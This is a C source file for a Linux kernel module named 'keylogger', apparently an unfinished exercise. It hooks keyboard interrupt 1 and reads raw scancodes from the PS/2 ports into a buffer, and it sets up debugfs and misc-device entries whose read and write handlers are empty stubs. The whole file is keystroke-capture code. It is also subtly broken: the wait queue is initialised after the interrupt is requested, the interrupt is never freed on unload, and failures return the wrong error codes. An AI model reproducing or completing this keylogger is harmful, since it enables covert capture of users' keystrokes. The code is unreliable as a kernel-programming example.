#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/debugfs.h>
#include <linux/fs.h>
#include <linux/wait.h>
#include <linux/interrupt.h>
#include <linux/miscdevice.h>


#define PATH "keylog"
#define KEYBOARD_STATUS 0x64
#define KEYBOARD_DATA 0x60

MODULE_LICENSE("GPL");
MODULE_AUTHOR("stmartin");
MODULE_DESCRIPTION("Module keylog");

static ssize_t	key_write(struct file *filep, const char *buffer, size_t len, loff_t *offset);
static ssize_t	key_read(struct file *filep, char *buffer, size_t len, loff_t *offset);

struct dentry		*dir_entry, *file_entry;
static unsigned short	kbd_buffer = 0x0000;
static wait_queue_head_t kbd_irq_waitq;

static ssize_t	key_write(struct file *filep, const char *buffer, size_t len, loff_t *offset)
{
	printk(KERN_INFO "in key_write\n");
	return 1;
}

static ssize_t	key_read(struct file *filep, char *buffer, size_t len, loff_t *offset)
{
/*	printk(KERN_INFO "in the read\n");
	DEFINE_WAIT(wait);
	printk(KERN_INFO "keylogger: after define\n");
	prepare_to_wait(&kbd_irq_waitq, &wait, TASK_INTERRUPTIBLE);
	printk(KERN_INFO "keylogger: after prepare\n");
        //schedule();
	//printk(KERN_INFO "keylogger: after schedule\n");
        finish_wait(&kbd_irq_waitq, &wait);
	printk(KERN_INFO "keylogger: after finish wait\n");*/
	return 0;
}

static struct file_operations	key_ops = {

	.owner = THIS_MODULE,
	.write = key_write,
	.read = key_read
};

static struct miscdevice	key_dev = {
	.minor = MISC_DYNAMIC_MINOR,
        .name = "keylogger",
        .fops = &key_ops
};

static int		create_dir(void)
{
	dir_entry = debugfs_create_dir(PATH, NULL);
	if (dir_entry == ERR_PTR(-ENODEV))
	{
		printk(KERN_INFO "failed create debugfs, CONFIG_DEBUG_FS have to be set yes\n");
		return 0;
	}
	else if (dir_entry == NULL)
	{
		printk(KERN_INFO "dir_entry is NULL in create_dir\n");
		return 0;
	}
	printk(KERN_INFO "dir_entry have been successfully created\n");
	return 1;
}

static int		create_file(const char *name, umode_t mode, struct file_operations *fops)
{
	file_entry = debugfs_create_file(name, mode, dir_entry, NULL, fops);
	if (file_entry == NULL)
	{
		printk(KERN_INFO "file creation failed\n");
		return 0;
	}
	printk(KERN_INFO "[%s] file have been well created\n", name);
	return 1;
}

static irqreturn_t 	kbd_irq_handler(int irq, void* dev_id)
{
	unsigned char status, scancode;

	status = inb(KEYBOARD_STATUS);
	scancode = inb(KEYBOARD_DATA);
	kbd_buffer = (unsigned short) ((status << 8) | (scancode & 0x00ff));
	wake_up_interruptible(&kbd_irq_waitq);
	return IRQ_HANDLED;
}

static int		__init keylogger_init(void)
{
	printk(KERN_INFO "in keylogger init function \n");
	if (create_dir() != 1)
	{
		printk(KERN_INFO "creation directory failed\n");
		return 1;
	}
	if (create_file("keylogs", 0660, &key_ops) != 1)
	{
		printk(KERN_INFO "file creation failed \n");
		return 1;
	}
	if (misc_register(&key_dev))
		return 1;
	printk(KERN_INFO "keylogger: name [%s] minor  [%i]\n", key_dev.name, key_dev.minor);
	request_irq(1, kbd_irq_handler, IRQF_SHARED, "keylogger", (void *)kbd_irq_handler);
	printk(KERN_INFO "keylogger: kbd_buffer -> [%d]\n", kbd_buffer);
	init_waitqueue_head(&kbd_irq_waitq);

	return 0;
}

static void		__exit keylogger_exit(void)
{
	printk(KERN_INFO "exit keylogger\n");
	debugfs_remove_recursive(dir_entry);
	misc_deregister(&key_dev);
}

module_init(keylogger_init);
module_exit(keylogger_exit);
